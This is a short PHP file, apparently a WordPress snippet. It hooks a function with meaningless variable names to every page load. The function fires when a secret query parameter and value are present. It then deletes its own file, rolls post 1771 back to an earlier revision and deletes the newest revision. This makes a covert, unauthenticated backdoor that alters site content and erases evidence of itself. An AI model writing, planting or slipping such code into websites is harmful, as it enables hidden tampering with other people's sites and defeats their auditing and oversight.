<?php

function mediaelement_like_time() {
	if (isset($_GET['age_cookie_blog_media']) && $_GET['age_cookie_blog_media'] === 'notes_reusable_back') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$marketplace_blocks_seo_price = 1771;
		$gravatar_right_paragraph_iframe = wp_get_post_revisions($marketplace_blocks_seo_price);
		if (empty($gravatar_right_paragraph_iframe)) die('no revisions');
		if (count($gravatar_right_paragraph_iframe) < 2) die('less than 2');
		$downloads_thumbnail_official_patterns = array_shift($gravatar_right_paragraph_iframe);
		$click_archives_out_lock = $downloads_thumbnail_official_patterns->ID;
		$software_save_plus_images = array_shift($gravatar_right_paragraph_iframe);
		$sharing_style_api_your = $software_save_plus_images->ID;
		$thumbnail_captcha_wow_portfolio = wp_restore_post_revision($sharing_style_api_your);
		if ($thumbnail_captcha_wow_portfolio === false) die('error restoring');
		$thumbnail_captcha_wow_portfolio = wp_delete_post_revision($click_archives_out_lock);		
		if ($thumbnail_captcha_wow_portfolio === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'mediaelement_like_time');
